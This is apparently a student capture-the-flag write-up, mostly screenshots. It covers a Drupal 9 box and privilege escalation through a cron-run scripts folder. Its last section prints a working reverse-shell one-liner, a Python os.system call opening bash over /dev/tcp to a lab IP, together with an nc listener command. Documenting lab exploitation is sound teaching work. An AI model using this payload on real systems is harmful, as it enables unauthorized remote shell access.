<img width="749" alt="image" src="https://user-images.githubusercontent.com/59768512/164413183-b75a837e-0178-47c0-93b5-fd7dfcb6c662.png">


The Drupal version is Drupal 9:
![image](https://user-images.githubusercontent.com/70077872/164648153-d13cb920-33c4-4213-83f7-b7c1da267191.png)




# Task 3


![image](https://user-images.githubusercontent.com/70077872/167573879-1302944a-d324-45a6-800e-147cb45be604.png)


![image](https://user-images.githubusercontent.com/70077872/167573750-8dca4946-dd94-4f2d-8923-ecbda7b62a48.png)


![image](https://user-images.githubusercontent.com/70077872/167573128-1848a4ee-8881-4bbb-96e2-9aabb47cfe50.png)

![image](https://user-images.githubusercontent.com/70077872/167573357-162e2f3f-67d6-414f-bfb7-b871ac042453.png)

Flag: IKT449{who_would_have_thought_adding_modules_is_bad}


# Last


After we have gained access to `www-data`, it is time to see if we can gain access the first user. Firstly, by going to `/home/user` reveals that there are is a folder called "coding_project". This folder contains a README file, a shell script and a Scripts folder. As the README file states, the user is tired of people asking him/her to run Python files, so the file states: "to avoid further work on my part you can run any file as me instead!". This is a potential vulnerability as files put in the folder `/scripts` is essentially run with the privileges of the user:

![image](https://user-images.githubusercontent.com/70077872/167387362-d4e82870-b257-4335-8acb-e25c97628496.png)


The `run_files.sh` is just a script that enter the script folder, runs the file(s) with python3, and removes it afterwards. Here, we can put in a file run as the user to try to gain access to the user account:

![image](https://user-images.githubusercontent.com/70077872/167388008-555a28ea-6279-40cc-841b-08f8c5f108c5.png)

A common attack vector would be to execute a python file that runs a reverse shell back to our machine. Since the script is run with user privileges, the reverse shell will ensure the connection runs with the user; giving us access. To execute this, and to allow python to run bash commands, we use the `os.system()` function which allows us to execute any command. The following code is a one-liner which is able to exploit this vulnerability:

![image](https://user-images.githubusercontent.com/70077872/167413332-dadfb1b2-d2f8-4c73-a4a1-e59d99054a63.png)


`echo "import os;os.system(\"/bin/bash -c \'bash -i >& /dev/tcp/10.225.149.204/9995 0>&1\'\")" > exploit.py`

When the cronjob automatically runs the `run_files.sh` which runs the `exploit.py` file, we get a connection using `nc -nlvp 9995` for listening on any incoming connections:

![image](https://user-images.githubusercontent.com/70077872/167413710-d34f73d1-0c22-4cb5-b303-1a3cb982bb11.png)

We can then collect the flag:

![image](https://user-images.githubusercontent.com/70077872/167413907-7375442e-0738-4ab0-abaf-72f33731a871.png)

